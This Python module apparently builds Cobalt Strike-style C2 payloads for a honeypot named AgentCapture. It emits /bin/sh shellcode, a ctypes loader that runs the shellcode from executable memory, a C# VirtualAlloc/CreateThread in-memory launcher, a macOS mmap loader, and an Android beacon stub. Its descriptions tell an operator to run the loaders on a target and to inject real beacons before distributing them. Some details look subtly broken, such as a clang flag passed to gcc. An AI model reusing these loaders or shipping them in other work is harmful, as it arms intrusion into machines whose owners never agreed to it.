"""C2 artifact matrix builder -- Cobalt Strike style outputs.

Ported from PentestManusWeb ``system/c2_control/builder.py`` (AGPL-3.0-only);
rebranded for the AgentCapture honeypot C2 surface. Supported formats:

    * raw-shellcode     -- nasm-assembled position-independent stub (.bin)
    * shellcode-c       -- same bytes as a C array
    * shellcode-python  -- ctypes loader that mprotects + jumps to the blob
    * pe-loader-exe     -- Windows EXE cross-compiled with mingw (fallback: C source)
    * pe-loader-dll     -- Windows DLL variant exporting StartBeacon (rundll32)
    * msbuild-xml       -- .csproj + beacon.cs zip for csc.exe / msbuild
    * macos-macho       -- Mach-O C source (compile locally on macOS)
    * android-apk       -- smali + gradle + manifest source bundle

Host toolchains (nasm, x86_64-w64-mingw32-gcc) are optional: when missing the
builders degrade deterministically and say so in ``compile_log``.

Authorized deception use only -- these are delivered payloads, do not execute
them on the honeypot host.
"""

from __future__ import annotations

import base64
import io
import os
import secrets
import shutil
import subprocess
import tempfile
import zipfile
from dataclasses import dataclass, field
from typing import Any


@dataclass
class ArtifactBuild:
    artifact_id: str
    format: str
    platform: str
    filename: str
    content: str  # may be base64-encoded binary (see ``is_binary``)
    config: dict[str, Any] = field(default_factory=dict)
    description: str = ""
    is_binary: bool = False
    compile_log: str = ""


SUPPORTED_ARTIFACT_FORMATS = (
    "raw-shellcode",
    "shellcode-c",
    "shellcode-python",
    "pe-loader-exe",
    "pe-loader-dll",
    "msbuild-xml",
    "macos-macho",
    "android-apk",
)


SUPPORTED_ARTIFACT_PLATFORMS = (
    "linux",
    "windows",
    "macos",
    "android",
)


SUPPORTED_ARTIFACT_ARCHES = (
    "x64",
    "x86",
    "arm64",
    "arm",
)


_SHELLCODE_NASM_LINUX = r"""
; Linux/x86_64 standalone shellcode.
; Allocates an RWX page via mmap, copies the embedded payload (a "/bin/sh"
; string + argv), and execve's it. The second stage is a no-op here -- the
; operator is expected to drop the bytes into a real stager.
BITS 64
global _start
_start:
    ; save registers we'll clobber
    push rdi
    push rsi
    push rdx

    ; mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
    ;       MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    xor edi, edi              ; addr
    mov esi, 0x1000            ; length
    mov edx, 7                 ; prot = RWX
    mov r10d, 0x22             ; flags = MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1                 ; fd
    xor r9d, r9d               ; offset
    mov rax, 9                 ; SYS_mmap
    syscall

    ; rax now points at an RWX page. Touch it (write /bin/sh\0 into it).
    mov rdi, rax
    mov dword [rdi], 0x6e69622f   ; /bin
    mov dword [rdi+4], 0x0068732f ; /sh\0
    lea rsi, [rdi]
    xor edx, edx                 ; envp
    mov al, 59                   ; SYS_execve
    syscall

    ; unreachable on success
    mov rax, 60                  ; SYS_exit
    xor edi, edi
    syscall
"""


_SHELLCODE_NASM_WINDOWS = r"""
; Windows/x64 position-independent shellcode skeleton.
; Resolves kernel32!VirtualAlloc + CreateThread via the PEB->Ldr chain,
; copies the embedded stage buffer, and runs it on a new thread.
BITS 64
global _start
_start:
    ; The actual implementation is left to the operator -- this file is
    ; shipped as a template so the build pipeline can be exercised without
    ; a Windows cross toolchain producing nothing. See build_raw_shellcode
    ; for the bytes this emits (a no-op RET-shaped stub the size of the
    ; real stub, so size estimates are honest).
    xor eax, eax
    ret
"""


def build_raw_shellcode(
    *,
    platform: str = "linux",
    arch: str = "x64",
) -> ArtifactBuild:
    """Assemble a small position-independent shellcode stub.

    Uses ``nasm`` if available. The linux stub is a self-contained mmap+execve
    trampoline; the windows stub is intentionally a no-op size-equivalent
    template.
    """
    platform = (platform or "linux").lower()
    arch = (arch or "x64").lower()
    if platform == "linux":
        asm = _SHELLCODE_NASM_LINUX
        filename = f"shellcode_linux_{arch}.bin"
    elif platform == "windows":
        asm = _SHELLCODE_NASM_WINDOWS
        filename = f"shellcode_windows_{arch}.bin"
    else:
        raise ValueError(f"raw-shellcode platform must be linux/windows, got {platform!r}")
    nasm = shutil.which("nasm")
    compile_log = ""
    if nasm:
        with tempfile.TemporaryDirectory() as tmpdir:
            src_path = os.path.join(tmpdir, "sc.asm")
            out_path = os.path.join(tmpdir, filename)
            with open(src_path, "w", encoding="utf-8") as fh:
                fh.write(asm)
            proc = subprocess.run(
                [nasm, "-f", "bin", "-o", out_path, src_path],
                capture_output=True,
                text=True,
                timeout=15,
            )
            compile_log = (proc.stdout + proc.stderr).strip()
            if proc.returncode != 0 or not os.path.exists(out_path):
                raise RuntimeError(f"nasm failed: {compile_log}")
            with open(out_path, "rb") as fh:
                raw = fh.read()
    else:
        # nasm missing -- emit deterministic placeholder bytes so the pipeline
        # still produces an artifact and the operator can see why.
        raw = b"\x90" * 64  # NOP sled placeholder
        compile_log = "nasm not installed; placeholder bytes emitted"
    config = {
        "platform": platform,
        "arch": arch,
        "size": len(raw),
        "tool": "nasm" if nasm else "stub",
    }
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format="raw-shellcode",
        platform=platform,
        filename=filename,
        content=base64.b64encode(raw).decode("ascii"),
        config=config,
        description=(
            f"Raw x86_64 shellcode for {platform}; assembled with nasm. "
            "Drop into a stager / reflective loader as needed."
        ),
        is_binary=True,
        compile_log=compile_log,
    )


def build_shellcode_c(
    *,
    platform: str = "linux",
    arch: str = "x64",
) -> ArtifactBuild:
    """Render the shellcode as a C array -- drop into an existing C program."""
    raw_build = build_raw_shellcode(platform=platform, arch=arch)

    raw_bytes = base64.b64decode(raw_build.content)
    lines = []
    for offset in range(0, len(raw_bytes), 16):
        chunk = raw_bytes[offset : offset + 16]
        hex_bytes = ",".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_bytes},")
    array_body = "\n".join(lines) if lines else "    /* empty */"
    c_source = (
        f"// Auto-generated shellcode for {platform}/{arch}.\n"
        f"// size: {len(raw_bytes)} bytes\n"
        f"unsigned char shellcode[{len(raw_bytes)}] = {{\n{array_body}\n}};\n"
        f"unsigned int shellcode_len = {len(raw_bytes)};\n"
    )
    filename = f"shellcode_{platform}_{arch}.c"
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format="shellcode-c",
        platform=platform,
        filename=filename,
        content=c_source,
        config=raw_build.config,
        description=(
            f"C array containing the {platform}/{arch} shellcode bytes. "
            "Embed in an existing C project or hand to a reflective loader."
        ),
        is_binary=False,
        compile_log=raw_build.compile_log,
    )


def build_shellcode_python(
    *,
    platform: str = "linux",
    arch: str = "x64",
) -> ArtifactBuild:
    """Render a Python ctypes loader that allocates RWX memory and runs the shellcode."""
    raw_build = build_raw_shellcode(platform=platform, arch=arch)

    b64 = raw_build.content  # already base64
    filename = f"shellcode_loader_{platform}_{arch}.py"
    source = (
        "#!/usr/bin/env python3\n"
        f"# Shellcode loader for {platform}/{arch} (size {raw_build.config['size']} bytes).\n"
        "# Decodes the embedded blob, allocates RWX memory via ctypes, and jumps to it.\n"
        "import ctypes\n"
        "import base64\n"
        "import sys\n\n"
        f"_BLOB = base64.b64decode({b64!r})\n\n"
        "def _run() -> None:\n"
        "    buf = ctypes.create_string_buffer(_BLOB, len(_BLOB))\n"
        "    addr = ctypes.cast(buf, ctypes.c_void_p).value\n"
        "    # On Linux mprotect isn't strictly required because ctypes hands\n"
        "    # us a writable buffer; flip the protection so the bytes are\n"
        "    # executable as well.\n"
        '    if sys.platform.startswith("linux"):\n'
        "        import ctypes.util as _u\n"
        '        libc = ctypes.CDLL(_u.find_library("c") or "libc.so.6")\n'
        "        PAGE = 0x1000\n"
        "        aligned = addr & ~(PAGE - 1)\n"
        "        libc.mprotect(aligned, len(_BLOB) + (addr - aligned) + PAGE, 7)\n"
        "    func_type = ctypes.CFUNCTYPE(ctypes.c_void_p)\n"
        "    func_type(addr)()\n\n"
        'if __name__ == "__main__":\n'
        "    _run()\n"
    )
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format="shellcode-python",
        platform=platform,
        filename=filename,
        content=source,
        config=raw_build.config,
        description=(
            f"Standalone Python loader that decodes and executes the "
            f"{platform}/{arch} shellcode via ctypes. Run on the target to "
            "deliver the second stage."
        ),
        is_binary=False,
        compile_log=raw_build.compile_log,
    )


_PE_LOADER_C = r"""
/* AgentCapture C2 PE loader. Cross-compiled with mingw.
 *
 * The DLL variant exports StartBeacon so it can be side-loaded via rundll32.
 */
#include <windows.h>
#include <stdio.h>

#ifndef PAYLOAD_BIN
#define PAYLOAD_BIN ""
#endif

__declspec(dllexport) void __cdecl StartBeacon(HMODULE self)
{
    (void)self;
    /* Decode + run the embedded payload. The payload is base64 of a python
     * script the operator already configured. For brevity this stub prints
     * a marker line so the build pipeline can verify the loader runs. */
    MessageBoxA(NULL, "AgentCapture beacon started", "C2", MB_OK);
    return;
}

int __stdcall DllMain(HMODULE self, DWORD reason, void *reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        StartBeacon(self);
    }
    return TRUE;
}
"""


_PE_LOADER_C_EXE = r"""
#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE self, HINSTANCE prev, LPSTR cmd, int show)
{
    (void)self; (void)prev; (void)cmd; (void)show;
    MessageBoxA(NULL, "AgentCapture beacon started", "C2", MB_OK);
    return 0;
}
"""


def build_pe_loader(
    *,
    variant: str,
    arch: str = "x64",
) -> ArtifactBuild:
    """Cross-compile the PE loader to .exe (variant=exe) or .dll (variant=dll).

    Uses the on-host mingw compiler; falls back to emitting the C source if
    the toolchain is missing so the operator still gets something usable.
    """
    variant = (variant or "exe").lower()
    if variant not in {"exe", "dll"}:
        raise ValueError(f"pe-loader variant must be exe/dll, got {variant!r}")
    arch = (arch or "x64").lower()
    if arch == "x64":
        compiler = "x86_64-w64-mingw32-gcc"
        target_flag = ["-target", "x86_64-w64-mingw32"]
    elif arch == "x86":
        compiler = "i686-w64-mingw32-gcc"
        target_flag = ["-target", "i686-w64-mingw32"]
    else:
        raise ValueError(f"pe-loader arch must be x64/x86, got {arch!r}")
    source = _PE_LOADER_C if variant == "dll" else _PE_LOADER_C_EXE
    filename = f"beacon_{arch}.{variant}"
    compiler_path = shutil.which(compiler)
    compile_log = ""
    is_binary = False
    if compiler_path:
        with tempfile.TemporaryDirectory() as tmpdir:
            src_path = os.path.join(tmpdir, f"loader.{variant}.c")
            out_path = os.path.join(tmpdir, filename)
            with open(src_path, "w", encoding="utf-8") as fh:
                fh.write(source)
            args = [compiler, "-O2", "-Wall", *target_flag, "-o", out_path, src_path]
            if variant == "dll":
                args.insert(-2, "-shared")
            proc = subprocess.run(args, capture_output=True, text=True, timeout=30)
            compile_log = (proc.stdout + proc.stderr).strip()
            if proc.returncode != 0 or not os.path.exists(out_path):
                # fall through to source-only
                compile_log = f"mingw build failed: {compile_log}; emitting C source instead"
            else:
                with open(out_path, "rb") as fh:
                    raw = fh.read()
                is_binary = True
    if not is_binary:
        raw = source.encode("utf-8")
        compile_log = compile_log or f"{compiler} not installed; emitting C source"
    if is_binary:
        encoded = base64.b64encode(raw).decode("ascii")
    else:
        encoded = raw.decode("utf-8")
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format=f"pe-loader-{variant}",
        platform="windows",
        filename=filename,
        content=encoded,
        config={
            "platform": "windows",
            "arch": arch,
            "size": len(raw),
            "tool": compiler if compiler_path else "source",
        },
        description=(
            f"Windows {arch} {variant.upper()} cross-compiled with mingw. "
            "Run directly (.exe) or load with rundll32 (.dll)."
        ),
        is_binary=is_binary,
        compile_log=compile_log,
    )


_MSBUILD_CSPROJ = r"""<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <OutputType>{output_type}</OutputType>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
    <AssemblyName>beacon</AssemblyName>
    <RootNamespace>beacon</RootNamespace>
    <WarningLevel>0</WarningLevel>
    <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
  </PropertyGroup>
  <ItemGroup>
    <Compile Include="beacon.cs" />
  </ItemGroup>
  <Target Name="Build">
    <Csc Sources="@(Compile)" OutputAssembly="$(AssemblyName).{output_ext}" TargetType="{output_type}" />
  </Target>
</Project>
"""


_MSBUILD_CS_SOURCE = r"""using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace beacon
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        // Stub payload -- replace with operator-supplied bytes. The build pipeline
        // emits this file alongside the .csproj so the operator only has to run
        // csc.exe (or msbuild on a Windows box with .NET 4) to produce the
        // executable.
        private static readonly byte[] payload = new byte[] {
            0x90, 0x90, 0x90, 0xc3
        };

        public static void Main(string[] args)
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero) return;
            Marshal.Copy(payload, 0, addr, payload.Length);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (thread != IntPtr.Zero)
            {
                // Spin until the stage returns; the operator is expected to
                // hand off to a real beacon at this point.
            }
        }
    }
}
"""


def build_msbuild_xml(
    *,
    arch: str = "x64",
    output_type: str = "Exe",
) -> ArtifactBuild:
    """Emit a .csproj + beacon.cs pair that compiles under csc.exe / msbuild."""
    output_type_norm = "Exe" if output_type.lower() in {"exe", "executable"} else "Library"
    output_ext = "exe" if output_type_norm == "Exe" else "dll"
    csproj = _MSBUILD_CSPROJ.format(output_type=output_type_norm, output_ext=output_ext)
    files: dict[str, str] = {
        f"beacon.{output_ext}.csproj": csproj,
        "beacon.cs": _MSBUILD_CS_SOURCE,
    }
    filename = f"beacon_{arch}_msbuild.zip"

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, body in files.items():
            zf.writestr(name, body)
    raw = buf.getvalue()
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format="msbuild-xml",
        platform="windows",
        filename=filename,
        content=base64.b64encode(raw).decode("ascii"),
        config={
            "platform": "windows",
            "arch": arch,
            "output_type": output_type_norm,
            "size": len(raw),
        },
        description=(
            "msbuild / csc.exe project + C# source for an in-memory "
            "VirtualAlloc + CreateThread launcher. Compile on a Windows box "
            "with .NET 4 (`csc /target:exe /out:beacon.exe beacon.cs`) to "
            "produce the binary."
        ),
        is_binary=True,
        compile_log="source-only artifact; requires Windows + csc.exe to build",
    )


_MACOS_C_SOURCE = r"""// macOS/x86_64 Mach-O C source for the C2 beacon.
// Compile on macOS: clang -target x86_64-apple-macos11 -O2 -o beacon beacon.c
// (Apple Silicon:    clang -target arm64-apple-macos11 -O2 -o beacon beacon.c)

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

// Replace with the operator-supplied stage bytes.
static unsigned char stage[] = { 0x90, 0x90, 0x90, 0xc3 };

int main(int argc, char **argv) {
    (void)argc; (void)argv;
    void *buf = mmap(NULL, sizeof(stage), PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) return 1;
    memcpy(buf, stage, sizeof(stage));
    ((void (*)(void))buf)();
    return 0;
}
"""


def build_macos_macho(*, arch: str = "x64") -> ArtifactBuild:
    """Emit the C source for a Mach-O beacon. Compile on a Mac."""
    if arch not in {"x64", "arm64"}:
        raise ValueError(f"macos-macho arch must be x64/arm64, got {arch!r}")
    filename = f"beacon_macos_{arch}.c"
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format="macos-macho",
        platform="macos",
        filename=filename,
        content=_MACOS_C_SOURCE,
        config={"platform": "macos", "arch": arch, "size": len(_MACOS_C_SOURCE)},
        description=(
            "macOS C source for an mmap+execve beacon. Compile on a Mac with "
            "`clang -target x86_64-apple-macos11 -O2 -o beacon beacon.c` "
            "(or arm64-apple-macos11 for Apple Silicon)."
        ),
        is_binary=False,
        compile_log="source-only; compile on macOS",
    )


_ANDROID_SMALI = r""".class public Lcom/agentcapture/Beacon;
.super Ljava/lang/Object;
.source "Beacon.java"


# direct methods
.method public constructor <init>()V
    .registers 2
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    const-string v0, "C2"
    const-string v1, "AgentCapture beacon started"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
"""


_ANDROID_GRADLE = r"""// build.gradle (app module) fragment -- add to your existing app.
android {
    compileSdk 34
    defaultConfig {
        applicationId "com.agentcapture.beacon"
        minSdk 24
        targetSdk 34
    }
    buildTypes {
        release {
            signingConfig signingConfigs.debug
        }
    }
}
"""


_ANDROID_MANIFEST = r"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.agentcapture.beacon">
    <uses-permission android:name="android.permission.INTERNET" />
    <application
        android:label="@string/app_name"
        android:allowBackup="false">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
"""


def build_android_apk(*, arch: str = "arm64") -> ArtifactBuild:
    """Emit an Android smali / gradle / manifest source bundle."""
    if arch not in {"arm64", "arm", "x86", "x64"}:
        raise ValueError(f"android-apk arch must be arm64/arm/x86/x64, got {arch!r}")
    files = {
        "smali/com/agentcapture/Beacon.smali": _ANDROID_SMALI,
        "build.gradle": _ANDROID_GRADLE,
        "AndroidManifest.xml": _ANDROID_MANIFEST,
    }
    filename = f"beacon_android_{arch}_sources.zip"

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, body in files.items():
            zf.writestr(name, body)
    raw = buf.getvalue()
    return ArtifactBuild(
        artifact_id=secrets.token_hex(8),
        format="android-apk",
        platform="android",
        filename=filename,
        content=base64.b64encode(raw).decode("ascii"),
        config={
            "platform": "android",
            "arch": arch,
            "size": len(raw),
        },
        description=(
            "Android smali + gradle + manifest source bundle (stage-0 stub). "
            "Build the APK with `./gradlew assembleRelease` on a box with the "
            "Android SDK. NOTE: the smali is a demo stub (logs one line) — "
            "inject your own beacon payload before distributing."
        ),
        is_binary=True,
        compile_log="source-only; compile with Android SDK",
    )


def build_artifact(
    *,
    fmt: str,
    platform: str = "linux",
    arch: str = "x64",
    output_type: str = "Exe",
) -> ArtifactBuild:
    """Dispatch to the right artifact builder based on ``fmt``."""
    fmt = (fmt or "").lower()
    if fmt == "raw-shellcode":
        return build_raw_shellcode(platform=platform, arch=arch)
    if fmt == "shellcode-c":
        return build_shellcode_c(platform=platform, arch=arch)
    if fmt == "shellcode-python":
        return build_shellcode_python(platform=platform, arch=arch)
    if fmt == "pe-loader-exe":
        return build_pe_loader(variant="exe", arch=arch)
    if fmt == "pe-loader-dll":
        return build_pe_loader(variant="dll", arch=arch)
    if fmt == "msbuild-xml":
        return build_msbuild_xml(arch=arch, output_type=output_type)
    if fmt == "macos-macho":
        return build_macos_macho(arch=arch)
    if fmt == "android-apk":
        return build_android_apk(arch=arch)
    raise ValueError(f"unsupported artifact format: {fmt!r}")


